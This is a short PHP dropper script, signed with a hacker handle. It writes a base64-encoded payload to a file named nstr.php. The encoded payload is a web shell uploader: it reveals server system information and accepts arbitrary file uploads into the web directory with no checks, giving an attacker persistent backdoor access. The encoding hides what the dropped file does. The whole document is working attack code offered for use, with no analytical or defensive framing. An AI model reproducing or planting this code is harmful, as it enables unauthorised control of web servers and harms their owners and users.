<?php
// By N4ST4R_ID
$nastar = fopen('nstr.php', 'w'); // nstr.php is your file name
$ganteng = "PD9waHAKZWNobyAiPGI+TjRTVDRSX0lEIC0gVXBsb2FkZXI8L2I+IjsKZWNobyAiPGJyPiIucGhwX3VuYW1lKCkuIjxicj4iOwplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nbmFzdGFyJz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPgo8L2Zvcm0+IjsKaWYoJF9QT1NUWyd1cGxvYWQnXSkgewoJaWYoQGNvcHkoJF9GSUxFU1snbmFzdGFyJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ25hc3RhciddWyduYW1lJ10pKSB7CgllY2hvICJNQU5UVUwgTVpaIjsKCX0gZWxzZSB7CgllY2hvICJOSklSIEdBR0FMIjsKCX0KfQo/Pg==";
// Uploader script encoded to base64
fwrite($nastar ,base64_decode($ganteng));
fclose($nastar);
?>